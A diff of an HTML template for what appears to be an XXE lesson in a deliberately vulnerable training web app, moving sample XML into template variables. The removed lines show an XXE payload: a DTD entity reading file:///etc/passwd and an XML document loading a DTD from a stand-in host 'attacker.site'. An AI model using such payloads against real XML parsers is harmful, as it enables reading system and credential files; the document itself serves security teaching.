@@ -8,12 +8,7 @@
 	<th:block th:if="${resultList == null}">
 		<form action="xxe" method="post" enctype="multipart/form-data">
 			<p th:text="#{msg.update.users.by.xml}" />
-			<pre id="code" class="prettyprint lang-xml">
-&lt;&#x3f;xml version&#x3d;&quot;1.0&quot;&#x3f;&gt;
-&lt;users&gt;
-&nbsp;&nbsp;&nbsp;&nbsp;&lt;user uid&#x3d;&quot;user11&quot; name&#x3d;&quot;Tommy&quot; password&#x3d;&quot;pasworld&quot; phone&#x3d;&quot;090-1004-5678&quot; mail&#x3d;&quot;user11&#x40;example.com&quot;&#x2f;&gt;
-&nbsp;&nbsp;&nbsp;&nbsp;&lt;user uid&#x3d;&quot;user12&quot; name&#x3d;&quot;Matt&quot; password&#x3d;&quot;PaSsWoRd&quot; phone&#x3d;&quot;090-9984-1118&quot; mail&#x3d;&quot;user12&#x40;example.com&quot;&#x2f;&gt;
-&lt;&#x2f;users&gt;</pre>
+		<pre id="code" class="prettyprint lang-xml" th:text="${sample_users_xml}"></pre>
 			<input type="file" name="file" size="60" /><br />
 			<p th:text="#{msg.select.upload.file}" />
 			<input type="submit" th:value="#{label.upload}" />
@@ -21,17 +16,11 @@
 			<div class="alert alert-info" role="alert">
 				<span class="glyphicon glyphicon-info-sign" th:utext="#{msg.note.xxe.step1}"></span>
 			</div>
-			<pre id="code" class="prettyprint lang-xml">
-&lt;&#x21;ENTITY &#x25; p1 SYSTEM &quot;file&#x3a;&#x2f;&#x2f;&#x2f;etc&#x2f;passwd&quot;&gt;
-&lt;&#x21;ENTITY &#x25; p2 &quot;&lt;&#x21;ATTLIST users ou CDATA &#x27;&#x25;p1&#x3b;&#x27;&gt;&quot;&gt;
-&#x25;p2&#x3b;</pre><br />
+			<pre id="code" class="prettyprint lang-xml" th:text="${xxe_dtd}"></pre><br />
 			<div class="alert alert-info" role="alert">
 				<span class="glyphicon glyphicon-info-sign" th:utext="#{msg.note.xxe.step2}"></span>
 			</div>
-			<pre id="code" class="prettyprint lang-xml">
-&lt;&#x3f;xml version&#x3d;&quot;1.0&quot;&#x3f;&gt;
-&lt;&#x21;DOCTYPE users SYSTEM &quot;http&#x3a;&#x2f;&#x2f;attacker.site&#x2f;vulnerable.dtd&quot; &gt;
-&lt;users &#x2f;&gt;</pre>
+			<pre id="code" class="prettyprint lang-xml" th:text="${xxe_xml}"></pre>
 		</form>
 	</th:block>
 	<th:block th:if="${resultList != null}">
